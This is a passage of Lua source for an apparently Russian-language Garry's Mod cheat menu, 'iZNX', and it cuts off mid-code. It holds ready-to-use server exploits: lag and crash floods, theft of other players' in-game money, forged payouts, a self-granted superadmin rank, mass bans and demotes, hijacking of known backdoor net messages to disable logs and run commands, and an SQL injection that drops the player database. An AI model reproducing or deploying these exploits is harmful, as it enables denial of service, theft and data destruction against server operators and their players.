iZNX.NetStart("TFA_Attachment_RequestAll")
net.SendToServer()
end
end )
end
end }
}
}
)
iZNX.AddExploit( "Lag Exploit #1", {
desc = "Exploit на лаги",
severity = 1,
scan = function() return iZNX.ValidNetString( "NDES_SelectedEmblem" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Начинаем лаги")
if not timer.Exists("lagger10") then
timer.Create("lagger10", 0.5, 0, function()
for i = 1, 2000 do
iZNX.NetStart("NDES_SelectedEmblem")
net.WriteString("Seized")
net.SendToServer()
end
end)
else
timer.Remove("lagger10")
iZNX.ChatText("Прекращаем лаги")
end
end, },
},
} )
iZNX.AddExploit( "Crasher #1", {
desc = "Exploit на краш сервера",
severity = 1,
scan = function() return iZNX.ValidNetString( "Morpheus.StaffTracker" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Крашим")
if not timer.Exists("crasher") then
timer.Create("crasher", 0.5, 0, function()
for i = 1, 2000 do
iZNX.NetStart("Morpheus.StaffTracker")
net.SendToServer()
end
end)
else
timer.Remove("crasher")
iZNX.ChatText("Останавливаем краш")
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit#2", {
desc = "Exploit на лаги",
severity = 1,
scan = function() return iZNX.ValidNetString( "join_disconnect" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Начинаем лаги")
if not timer.Exists("lagglol") then
timer.Create("lagglol", 0.5, 0, function()
for i = 1, 3000 do
iZNX.NetStart("join_disconnect")
net.WriteEntity(table.Random(player.GetAll()))
net.SendToServer()
end
end)
else
timer.Remove("lagglol")
iZNX.ChatText("Прекращаем лаги")
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #3", {
desc = "Exploit на лаги",
severity = 1,
scan = function() return iZNX.ValidNetString( "EZS_PlayerTag" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Начинаем лаги")
if not timer.Exists("laggslol") then
timer.Create("laggslol", 0.5, 0, function()
for k, v in pairs(player.GetAll()) do
iZNX.NetStart("EZS_PlayerTag")
net.WriteEntity(v)
net.WriteString("Seized")
net.SendToServer()
timer.Simple(2, function()
iZNX.NetStart("EZS_PlayerTag")
net.WriteEntity(v)
net.WriteString("Seized")
net.SendToServer()
end )
end
end )
else
timer.Remove("laggslol")
iZNX.ChatText("Прекращаем лаги")
end
end }
}
}
)
iZNX.AddExploit( "Remove Spread", {
desc = "Exploit убирает разброс",
severity = 1,
scan = function() return checkcvar end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
hook.Remove("PlayerTick", "WyoziAdvTTTSpreadOverTime")
iZNX.ChatText("Разброс убран")
end }
}
}
)
iZNX.AddExploit( "Give physgun", {
desc = "Получение физгана",
severity = 1,
scan = function() return iZNX.ValidNetString( "BuyFirstTovar" ) end,
functions = {
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("BuyFirstTovar")
net.WriteString("0")
net.SendToServer()
iZNX.ChatText("Получен physgun")
end }
}
}
)
iZNX.AddExploit( "Give gravity gun", {
desc = "Получение гравити гана",
severity = 1,
scan = function() return iZNX.ValidNetString( "BuySecondTovar" ) end,
functions = {
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("BuySecondTovar")
net.WriteString("0")
net.SendToServer()
iZNX.ChatText("Получен gravity gun")
end }
}
}
)
iZNX.AddExploit( "Auto-Heal", {
desc = "Exploit на автоматическое лечение",
severity = 1,
scan = function() return iZNX.ValidNetString( "GiveHealthNPC" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if not autoheal_enable then
iZNX.ChatText("AutoHeal - вкл")
hook.Add("Think", "RE.CheckHealt", function()
if LocalPlayer():Health() < 100 then
iZNX.NetStart("GiveHealthNPC")
net.WriteString("100")
net.SendToServer()
end
end)
autoheal_enable = true
else
iZNX.ChatText("AutoHeal - выкл")
hook.Remove("Think", "RE.CheckHealt")
autoheal_enable = false
end
end }
}
}
)
iZNX.AddExploit( "Unbox System Manipulation Exploit #1", {
desc = "Exploit с ключами и кейсами из CSGO",
severity = 1,
scan = function() return iZNX.ValidNetString( "BuyKey" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Получаем ключ")
iZNX.NetStart("BuyKey")
net.SendToServer()
end }
}
}
)
iZNX.AddExploit( "Unbox System Manipulation Exploit #2", {
desc = "Exploit с ключами и кейсами из CSGO",
severity = 1,
scan = function() return iZNX.ValidNetString( "BuyCrate" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Получаем кейс")
iZNX.NetStart("BuyCrate")
net.SendToServer()
end }
}
}
)
iZNX.AddExploit( "Get Weapon", {
desc = "Exploit на получение оружия",
severity = 1,
scan = function() return iZNX.ValidNetString( "MONEY_SYSTEM_GetWeapons" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Получаем оружие")
for i = 1,32 do
iZNX.NetStart("MONEY_SYSTEM_GetWeapons")
net.WriteInt(i, 8)
net.SendToServer()
end
end }
}
}
)
iZNX.AddExploit( "Demote Exploit", {
desc = "Exploit на увольнение всех людей на сервере",
severity = 1,
scan = function() return iZNX.ValidNetString( "MCon_Demote_ToServer" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Увольняем")
for k,v in pairs(player.GetAll()) do
iZNX.NetStart("MCon_Demote_ToServer")
net.WriteString(v:SteamID())
net.SendToServer()
end
end }
}
}
)
iZNX.AddExploit( "€ Printers Money Stealer # €", {
desc = "Exploit на воровство денег с чужих принтеров",
severity = 1,
scan = function() return iZNX.ValidNetString( "SyncPrinterButtons16690" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "CopySploit_exploit_money" ) then
iZNX.ChatText( "Воруем чужие деньги" )
timer.Create( "CopySploit_exploit_money", 0.1, 0, function()
for k, v in pairs(ents.GetAll()) do
if v:GetModel() == "models/props_c17/consolebox01a.mdl" then
iZNX.NetStart( "SyncPrinterButtons16690" )
net.WriteEntity(v)
net.WriteUInt(2, 4)
net.SendToServer()
end
end
end)
else
timer.Remove( "CopySploit_exploit_money" )
iZNX.ChatText( "Прекращаем воровать" )
end
end, },
},
} )
iZNX.AddExploit( "€ Derma Printers Money Stealer €", {
desc = "Exploit на воровство денег с чужих принтеров",
severity = 1,
scan = function() return iZNX.ValidNetString( "withdrawp" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Воруем - "..#ents.FindByClass("derma_printer").." шт.")
for k,v in pairs(ents.FindByClass("derma_printer")) do
net.Start("withdrawp")
net.WriteEntity(v)
net.SendToServer()
end
end }
}
}
)
iZNX.AddExploit( "€ Money Exploit €", {
desc = "DarkRP_SS_Gamble",
severity = 1,
scan = function() return iZNX.ValidNetString( "DarkRP_SS_Gamble" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart( "DarkRP_SS_Gamble" )
net.WriteInt(50000, 32)
net.WriteInt(1, 32)
net.WriteInt(0, 32)
net.WriteInt(0, 32)
net.WriteInt(1, 32)
net.SendToServer()
end }
}
})
iZNX.AddExploit( "TestPromoCode", {
desc = "что-то связаное с компами, хз",
severity = 1,
scan = function() return iZNX.ValidNetString( "PCAdd" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart( "PCAdd" )
net.WriteString("alahman")
net.WriteString("300000000")
net.SendToServer()
timer.Simple(3,function()
iZNX.NetStart("ActivatePC")
net.WriteString("alahman")
net.SendToServer()
iZNX.NetStart("PCDelAll")
net.SendToServer()
end
)
end}
}
}
)
--[[ TO FIX!!! -------------------------------------------------------------------
iZNX.AddExploit( "Disguise/Маскировка #2", {
desc = "DarkRP_SS_Gamble",
severity = 1,
scan = function() return iZNX.ValidNetString( "DarkRP_SS_Gamble" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText( "Тадам" )
end }
}
})
----------------------------------------------------------------------------------]]
iZNX.AddExploit( "Ulx Console Flood", {
desc = "Обычный ulx flood в консоль",
severity = 1,
scan = function() return ulx end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if ulxflood then
hook.Remove("Think", "FloodULX")
ulxflood = false
else
hook.Add("Think", "FloodULX", function()
LocalPlayer():ConCommand("_u Seized")
end)
ulxflood = true
end
iZNX.ChatText("UlxFlood - "..tostring(ulxflood))
end }
}
}
)
iZNX.AddExploit( "HL2RP Disp", {
desc = "Запускает одну голосовую команду, по типу коменданского часа (как в hl2)",
severity = 1,
scan = function() return iZNX.ValidNetString( "viv_hl2rp_disp_message" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText( "Запускаем" )
for name, command in pairs (dispatchCommands) do
iZNX.NetStart("viv_hl2rp_disp_message")
net.WriteString(command)
net.SendToServer()
end
end }
}
}
)
iZNX.AddExploit( "HL2RP Disp Flood", {
desc = "Запускает много голосовых команд, по типу коменданского часа (как в hl2)",
severity = 1,
scan = function() return iZNX.ValidNetString( "viv_hl2rp_disp_message" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText( "Flood - on" )
if not timer.Exists("HL2RPFLOOD") then
timer.Create("HL2RPFLOOD", 0, 0, function()
for name, command in pairs (dispatchCommands) do
iZNX.NetStart("viv_hl2rp_disp_message")
net.WriteString(command)
net.SendToServer()
end
end
)
else
timer.Remove("HL2RPFLOOD")
iZNX.ChatText( "Flood - off" )
end
end }
}
}
)
iZNX.AddExploit( "Easter Egg", {
desc = "Находит пасхальные яйца",
severity = 1,
scan = function() return iZNX.ValidNetString( "egg" ) end,
functions = {
{ typ = "func", name = "1 яйцо", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
RunConsoleCommand("say", "4bigz")
end, },
{ typ = "func", name = "2 яйцо", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
RunConsoleCommand("cc_egg2")
end, },
{ typ = "func", name = "3 яйцо", func = function()
iZNX.NetStart("egg")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Атака нулевого дня #1", {
desc = "Вызывает моментальный сбой в работе системы и сервер крашится к чертям",
severity = 1,
scan = function() return iZNX.ValidNetString( "Sbox_gm_attackofnullday" ) end,
functions = {
{ typ = "func", name = "Начать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
RunConsoleCommand("gm_attackofnullday")
end, },
},
} )
iZNX.AddExploit( "Атака нулевого дня #2", {
desc = "Выдает вам суперадминку",
severity = 1,
scan = function() return iZNX.ValidNetString( "Sbox_gm_attackofnullday_key" ) end,
functions = {
{ typ = "func", name = "Начать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText( "Выдаем админку" )
iZNX.NetStart("Sbox_gm_attackofnullday_key")
net.WriteString( "ulx adduser \""..lp:Nick().."\" superadmin" )
net.WriteBit(0)
net.SendToServer()
RunConsoleCommand("gm_attackofnullday")
end, },
},
} )
iZNX.AddExploit( "Toggle TTT Report Bypass", {
desc = "TTT Report Bypass",
severity = 1,
scan = function() return isttt end,
functions = {
{ typ = "func", name = "Начать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if bypass == 0 then
	            hook.Add("Think", "remove_ttt_report", function()
	                local pan = vgui.GetHoveredPanel()
	                CheckChild(pan)
	            end)

	            iZNX.ChatText("Report Bypass включен")
	            bypass = 1
	        else
	            hook.Remove("Think", "remove_ttt_report")
	            iZNX.ChatText("Report Bypass выключен")
	            bypass = 0
end
end }
}
}
)

--[[ ------------------------------------------------------------------------------------------------------------------------------------
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!   OLD SHIT   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-----------------------------------------------------------------------------------------------------------------------------------------]]
iZNX.AddExploit( "€ Customizable Printers Money Stealer €", {
desc = "Мгновенно крадет все деньги от каждого принтера на сервере",
severity = 3,
scan = function() return iZNX.ValidNetString( "SyncPrinterButtons76561198056171650" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "CopySploit_exploit_shekels" ) then
iZNX.ChatText( "Воруем чужие деньги" )
timer.Create( "CopySploit_exploit_shekels", 0.1, 0, function()
for k, v in pairs(ents.GetAll()) do
if( v:GetClass():find("print") ) then
iZNX.NetStart( "SyncPrinterButtons76561198056171650" )
net.WriteEntity(v)
net.WriteUInt(2, 4)
net.SendToServer()
end
end
end)
else
timer.Remove( "CopySploit_exploit_shekels" )
iZNX.ChatText( "Прекращаем воровать" )
end
end, },
},
} )
iZNX.AddExploit( "ULX Friends Spam", {
desc = "Спам сообщением на сервере",
severity = 1,
scan = function() return (iZNX.ValidNetString( "sendtable" ) and ulx and ulx.friends ) end,
functions = {
{ typ = "string", name = "Введите сообщение", default = "FUCK YOU", addr = "fr_spamstring" },
{ typ = "players", addr = "fr_players" },
{ typ = "func", name = "Big Spam", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "bigspams" ) then
iZNX.ChatText( "Начинаем спам" )
timer.Create( "bigspams", 0.5, 0, function()
local t = iZNX.GetStored( "fr_players", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local buyit = {}
for i = 1, 15 do
table.insert( buyit, iZNX.GetStored( "fr_spamstring", "FUCK YOU" ) )
end
iZNX.NetStart( "sendtable" )
net.WriteEntity( v )
net.WriteTable( buyit )
net.SendToServer()
end
end)
else
timer.Remove( "bigspams" )
iZNX.ChatText( "Прекращаем спам" )
end
end, },
},
} )
iZNX.AddExploit( "Console Error Spammer", {
desc = "(Поражение rcon сервера массовыми ошибками)",
severity = 1,
scan = function() return iZNX.ValidNetString( "steamid2" ) end,
functions = {
{ typ = "func", name = "Big Spam", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "CopySploit_exploit_errorz" ) then
iZNX.ChatText( "Error спам запущен" )
timer.Create( "CopySploit_exploit_errorz", 0.1, 0, function()
iZNX.NetStart( "steamid2" )
net.WriteString( "Something is creating very strong script errors" )
net.SendToServer()
end)
else
timer.Remove( "CopySploit_exploit_errorz" )
iZNX.ChatText( "Error спам остановлен" )
end
end, },
},
} )
iZNX.AddExploit( "Turbo Error Spammer", {
desc = "Поражение rcon сервера массовыми ошибками",
severity = 2,
scan = function() return iZNX.ValidNetString( "steamid2" ) end,
functions = {
{ typ = "func", name = "Big Spam", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "CopySploit_exploit_errorzt" ) then
iZNX.ChatText( "Error спам запущен" )
timer.Create( "CopySploit_exploit_errorzt", 0, 0, function()
for i = 1, 100 do
iZNX.NetStart( "steamid2" )
net.WriteString( "Something is creating very strong script errors" )
net.SendToServer()
end
end)
else
timer.Remove( "CopySploit_exploit_errorzt" )
iZNX.ChatText( "Error спам остановлен" )
end
end, },
},
} )
iZNX.AddExploit( "€ Kun Drug €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "Kun_SellDrug" ) end,
functions = {
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "CopySploit_exploit_selldrugon" ) then
iZNX.ChatText( "Exploit запущен" )
timer.Create( "CopySploit_exploit_selldrugon", 0, 0, function()
for i=1,1000 do
iZNX.NetStart("Kun_SellDrug")
net.WriteString("mushroom")
net.SendToServer()
end
end)
else
timer.Remove( "CopySploit_exploit_selldrugon" )
iZNX.ChatText( "Exploit остановлен" )
end
end, },
},
} )
iZNX.AddExploit( "Point Shop Unbox", {
desc = "Exploit, связанный с аддоном Point Shop",
severity = 2,
scan = function() return iZNX.ValidNetString( "net_PSUnBoxServer" ) end,
functions = {
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(player.GetAll()) do
local i = 0
for k2,v2 in pairs(PS.Items) do
if !v:PS_HasItem(v2.ID) then
timer.Simple(k*i*1.7,function()
iZNX.NetStart("net_PSUnBoxServer")
net.WriteEntity(v)
net.WriteString(v2.ID)
net.SendToServer()
end)
i = i + 1
end
end
end
end, },
},
} )
iZNX.AddExploit( "☢ PatchPlay Give Superadmin ☢", {
desc = "Выдача супер админки (нужен перезаход на сервер!)",
severity = 1,
scan = function() return iZNX.ValidNetString( "pplay_deleterow" ) end,
functions = {
{ typ = "players", addr = "l_superadmins" },
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_superadmins", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local id = v:SteamID()
local tbl = {}
tbl.name = "FAdmin_PlayerGroup"
tbl.where = {
"steamid",
tostring(id)
}
iZNX.NetStart("pplay_deleterow")
net.WriteTable(tbl)
net.SendToServer()
local tbl = {}
tbl.tblname = "FAdmin_PlayerGroup"
tbl.tblinfo = {
tostring(id),
"superadmin"
}
iZNX.NetStart("pplay_addrow")
net.WriteTable(tbl)
net.SendToServer()
iZNX.ChatText( "Выдана супер админка "..v:Nick() )
end
end, },
},
} )
local thefrenchenculer = ""
if iZNX.ValidNetString( "Sandbox_ArmDupe" ) then
thefrenchenculer = "Sandbox_ArmDupe"
else
if iZNX.ValidNetString( "Sbox_darkrp" ) then
thefrenchenculer = "Sbox_darkrp"
else
if iZNX.ValidNetString( "Sbox_itemstore" ) then
thefrenchenculer = "Sbox_itemstore"
else
if iZNX.ValidNetString( "Ulib_Message" ) then
thefrenchenculer = "Ulib_Message"
else
if iZNX.ValidNetString( "ULogs_Info" ) then
thefrenchenculer = "ULogs_Info"
else
if iZNX.ValidNetString( "ITEM" ) then
thefrenchenculer = "ITEM"
else
if iZNX.ValidNetString( "fix" ) then
thefrenchenculer = "fix"
else
if iZNX.ValidNetString( "Fix_Keypads" ) then
thefrenchenculer = "Fix_Keypads"
else
if iZNX.ValidNetString( "Remove_Exploiters" ) then
thefrenchenculer = "Remove_Exploiters"
else
if iZNX.ValidNetString( "noclipcloakaesp_chat_text" ) then
thefrenchenculer = "noclipcloakaesp_chat_text"
else
if iZNX.ValidNetString( "_Defqon" ) then
thefrenchenculer = "_Defqon"
else
if iZNX.ValidNetString( "_CAC_ReadMemory" ) then
thefrenchenculer = "_CAC_ReadMemory"
else
if iZNX.ValidNetString( "nostrip" ) then
thefrenchenculer = "nostrip"
else
if iZNX.ValidNetString( "nocheat" ) then
thefrenchenculer = "nocheat"
else
if iZNX.ValidNetString( "LickMeOut" ) then
thefrenchenculer = "LickMeOut"
else
if iZNX.ValidNetString( "ULX_QUERY2" ) then
thefrenchenculer = "ULX_QUERY2"
else
if iZNX.ValidNetString( "ULXQUERY2" ) then
thefrenchenculer = "ULXQUERY2"
else
if iZNX.ValidNetString( "MoonMan" ) then
thefrenchenculer = "MoonMan"
else
if iZNX.ValidNetString( "Im_SOCool" ) then
thefrenchenculer = "Im_SOCool"
else
if iZNX.ValidNetString( "Sandbox_GayParty" ) then
thefrenchenculer = "Sandbox_GayParty"
else
if iZNX.ValidNetString( "DarkRP_UTF8" ) then
thefrenchenculer = "DarkRP_UTF8"
else
if iZNX.ValidNetString( "oldNetReadData" ) then
thefrenchenculer = "oldNetReadData"
else
if iZNX.ValidNetString( "memeDoor" ) then
thefrenchenculer = "memeDoor"
else
if iZNX.ValidNetString( "BackDoor" ) then
thefrenchenculer = "BackDoor"
else
if iZNX.ValidNetString( "OdiumBackDoor" ) then
thefrenchenculer = "OdiumBackDoor"
else
if iZNX.ValidNetString( "SessionBackdoor" ) then
thefrenchenculer = "SessionBackdoor"
else
if iZNX.ValidNetString( "DarkRP_AdminWeapons" ) then
thefrenchenculer = "DarkRP_AdminWeapons"
else
if iZNX.ValidNetString( "cucked" ) then
thefrenchenculer = "cucked"
else
if iZNX.ValidNetString( "NoNerks" ) then
thefrenchenculer = "NoNerks"
else
if iZNX.ValidNetString( "kek" ) then
thefrenchenculer = "kek"
else
if iZNX.ValidNetString( "ZimbaBackDoor" ) then
thefrenchenculer = "ZimbaBackDoor"
else
if iZNX.ValidNetString( "something" ) then
thefrenchenculer = "something"
else
if iZNX.ValidNetString( "random" ) then
thefrenchenculer = "random"
else
if iZNX.ValidNetString( "strip0" ) then
thefrenchenculer = "strip0"
else
if iZNX.ValidNetString( "fellosnake" ) then
thefrenchenculer = "fellosnake"
else
if iZNX.ValidNetString( "enablevac" ) then
thefrenchenculer = "enablevac"
else
if iZNX.ValidNetString( "idk" ) then
thefrenchenculer = "idk"
else
if iZNX.ValidNetString( "c" ) then
thefrenchenculer = "c"
else
if iZNX.ValidNetString( "killserver" ) then
thefrenchenculer = "killserver"
else
if iZNX.ValidNetString( "fuckserver" ) then
thefrenchenculer = "fuckserver"
else
if iZNX.ValidNetString( "cvaraccess" ) then
thefrenchenculer = "cvaraccess"
else
if iZNX.ValidNetString( "rcon" ) then
thefrenchenculer = "rcon"
else
if iZNX.ValidNetString( "rconadmin" ) then
thefrenchenculer = "rconadmin"
else
if iZNX.ValidNetString( "web" ) then
thefrenchenculer = "web"
else
if iZNX.ValidNetString( "jesuslebg" ) then
thefrenchenculer = "jesuslebg"
else
if iZNX.ValidNetString( "zilnix" ) then
thefrenchenculer = "zilnix"
else
if iZNX.ValidNetString( "Þà?D)◘" ) then
thefrenchenculer = "Þà?D)◘"
else
if iZNX.ValidNetString( "disablebackdoor" ) then
thefrenchenculer = "disablebackdoor"
else
if iZNX.ValidNetString( "kill" ) then
thefrenchenculer = "kill"
else
if iZNX.ValidNetString( "DefqonBackdoor" ) then
thefrenchenculer = "DefqonBackdoor"
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
iZNX.AddExploit( ".NET Backdoor", {
desc = "Найден .net backdoor: "..thefrenchenculer.."",
severity = 1,
scan = function() return iZNX.ValidNetString( thefrenchenculer ) end,
functions = {
{ typ = "func", name = "Отключить логи", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart(thefrenchenculer)
net.WriteString( "RunConsoleCommand(\"ulx_logecho\", \"0\")" )
net.WriteBit(1)
net.SendToServer()
end, },
{ typ = "func", name = "bd_menu", func = function()
iZNX.Menu:Remove()
RunConsoleCommand( "bd_menu" )
end, },
{ typ = "htxcommandeliste", name = "Список команд" },
{ typ = "soundboard", name = "SoundBoard" },
{ typ = "players", addr = "give_superadmins" },
{ typ = "func", name = "Superadmin", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "give_superadmins", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local id = v:SteamID()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "ulx adduserid "..id.." superadmin" )
net.WriteBit(false)
net.SendToServer()
end
end, },
{ typ = "func", name = "Забанить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "give_superadmins", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local id = v:SteamID()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "ulx banid "..id.." 0 nudop udu Haxyu" )
net.WriteBit(false)
net.SendToServer()
end
end }
}
}
)
iZNX.AddExploit( "☢ Трахнуть базу данных SQL ☢", {
desc = "Уничтожение базы данных darkrp master, стирая все данные игроков, вы должны быть супер админом !!",
severity = 4,
scan = function() return iZNX.ValidNetString( "pplay_sendtable" ) end,
functions = {
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local tbl = {}
tbl.tblname = "darkrp_door; DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)"
tbl.ply = LocalPlayer()
iZNX.NetStart("pplay_sendtable")
net.WriteTable(tbl)
net.SendToServer()
iZNX.ChatText( "База данных SQL Server уничтожена" )
end, },
},
} )
iZNX.AddExploit( "Уничтожить данные сервера", {
desc = "Уничтожение данных сервера, вероятно будет бесить одменов)",
severity = 3,
scan = function() return iZNX.ValidNetString( "WriteQuery" ) end,
functions = {
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "CopySploit_exploit_datatrasher" ) then
iZNX.ChatText( "Запуск спама в данные сервера" )
timer.Create( "CopySploit_exploit_datatrasher", 0.5, 0, function()
iZNX.NetStart( "WriteQuery" )
net.WriteString( "LOL" )
net.SendToServer()
end)
else
timer.Remove( "CopySploit_exploit_datatrasher" )
iZNX.ChatText( "Прекращение спама" )
end
end, },
},
} )
iZNX.AddExploit( "[NEW] Broadcast", {
desc = "Большой спам, очень скучный",
severity = 1337,
scan = function() return iZNX.ValidNetString( "VJSay" ) end,
functions = {
{ typ = "string", name = "Введите сообщение", default = "CopySploitMenu", addr = "vj_string" },
{ typ = "func", name = "Начать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Broadcasting")
iZNX.NetStart("VJSay")
net.WriteEntity(nil)
net.WriteString( iZNX.GetStored( "vj_string" ) )
net.WriteString("")
net.SendToServer()
end }
}
}
)
iZNX.AddExploit( "Give weapons", {
desc = "Exploit дает вам гребаное оружие | Большой шанс неработоспособности",
severity = 3,
scan = function() return iZNX.ValidNetString( "CraftSomething" ) end,
functions = {
{ typ = "string", name = "Тип оружия", default = "ls_sniper", addr = "armes_a_prendre" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart( "CraftSomething" )
net.WriteEntity( LocalPlayer() )
net.WriteString( iZNX.GetStored( "armes_a_prendre" ) )
net.WriteString( "" )
net.WriteString( "weapon" )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "ULX Extended ", {
desc = "Осторожно! Этот эксплойт опасен, если аддон обновлен вы будете кикнуты",
severity = 3,
scan = function() return iZNX.ValidNetString( "banleaver" ) end,
functions = {
{ typ = "func", name = "Забанить админов", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(player.GetAll()) do
if v:GetUserGroup() != "user" then -- Custom first ranks, youre fucked bro
if v != LocalPlayer() then
iZNX.NetStart("banleaver")
net.WriteString(v:SteamID().."{sep}".."bb")
net.SendToServer()
end
end
end
end, },
{ typ = "func", name = "Забанить всех", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(player.GetAll()) do
if v != LocalPlayer() then
iZNX.NetStart("banleaver")
net.WriteString(v:SteamID().."{sep}".."bb")
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "€ Casino NPC €", {
desc = "Exploit на очень эффективные деньги, купим шлюх и кокс ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "75_plus_win" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent" },
{ typ = "players", addr = "l_players_listing" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_listing", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "75_plus_win" )
net.WriteString( iZNX.GetStored( "montant_argent" ) )
net.WriteEntity(v)
net.SendToServer()
end
end, },
{ typ = "func", name = "Забрать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_listing", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "75_plus_win" )
net.WriteString( -iZNX.GetStored( "montant_argent" ) )
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ ATM €", {
desc = "Exploit на деньги, идем покупать шлюх и кокс ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "ATMDepositMoney" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent5" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart( "ATMDepositMoney" )
net.WriteFloat( -iZNX.GetStored( "montant_argent5" ) )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "TAXI Spawn Lag", {
desc = "Exploit чтобы ссать на процессоры кодеров ;)",
severity = 2,
scan = function() return iZNX.ValidNetString( "Taxi_Add" ) end,
functions = {
{ typ = "func", name = "Спавн", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local Pos = LocalPlayer():GetEyeTrace().HitPos
iZNX.NetStart("Taxi_Add")
net.WriteString("Taxi Super Exploit #"..math.random( 1, 9999 ))
net.WriteTable({[1]=Pos.x,[2]=Pos.y,[3]=Pos.z})
net.WriteFloat(-9999999)
